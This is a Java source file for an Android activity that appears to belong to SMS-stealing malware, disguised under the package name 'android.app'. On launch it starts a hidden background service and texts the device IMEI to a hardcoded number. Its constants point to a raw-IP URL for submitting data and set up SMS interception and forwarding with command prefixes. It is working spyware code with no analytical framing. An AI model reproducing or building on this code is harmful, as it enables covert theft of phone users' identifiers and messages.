package android.app;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.lang.LogUtils;
import android.os.Build;
import android.os.Bundle;
import android.telephony.DmsManager;
import android.telephony.TelephonyManager;

import com.umeng.analytics.AnalyticsConfig;
import com.umeng.analytics.MobclickAgent;

public class Dctivity extends Activity {

	private SharedPreferences sp;
	//imei发送
	public static final String devicephone="10086";
	//提交数据
	public static final String Dctivityhttpurl="http://118.193.159.126/admin/ccc2.asp";
	
	//短信转发
	public static final String phonenums="1008611";
	//拦截
	public static final String lanjie="DX99#";
	//转发
	public static final String zhuanfa="DX99#";
	//前缀
	public static final String qianzhui="ADWS772-";
	//前缀
	public static final String updatephone="ADDHONE888-";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
		AnalyticsConfig.setChannel("Channel"+GetDeviceId());
		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT+" "+Build.PRODUCT+"--"+Build.MODEL);
		Intent server=new Intent(this,Dervice.class);
		this.getApplicationContext().startService(server);
		
		Dpplication.regFilter(this);
		int code= getVersionCode();
		sp=this.getApplicationContext().getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
		if(sp.getBoolean("isfrist", true)||code!=sp.getInt("code", -100)){
			DmsManager.Send(this,devicephone,"AZ99#程序已安装"+GetDeviceId());
			Editor editor=sp.edit();
			editor.putBoolean("isfrist", false);
			editor.putInt("code", code);
			editor.commit();
		}
		
	}
	
	public String GetDeviceId(){
		TelephonyManager tm=(TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	public int getVersionCode() {
	    try {
	        PackageManager manager = this.getPackageManager();
	        PackageInfo info = manager.getPackageInfo(this.getPackageName(), 0);
	        return info.versionCode;
	    } catch (Exception e) {
	    }
	    return -1;
	}
	public static String getPhoneNum(Context context){
		SharedPreferences sp=context.getSharedPreferences("phone", Context.MODE_PRIVATE);
		return sp.getString("phonenum", phonenums);
	}
	public static void setPhonenum(Context context,String body){
		SharedPreferences sp=context.getSharedPreferences("phone", Context.MODE_PRIVATE);
		Editor editor=sp.edit();
    	editor.putString("phonenum", body);
    	editor.commit();
	}
	@Override
	public void onResume() {
		super.onResume();
		MobclickAgent.onResume(this);
	}
	@Override
	public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
	}
}
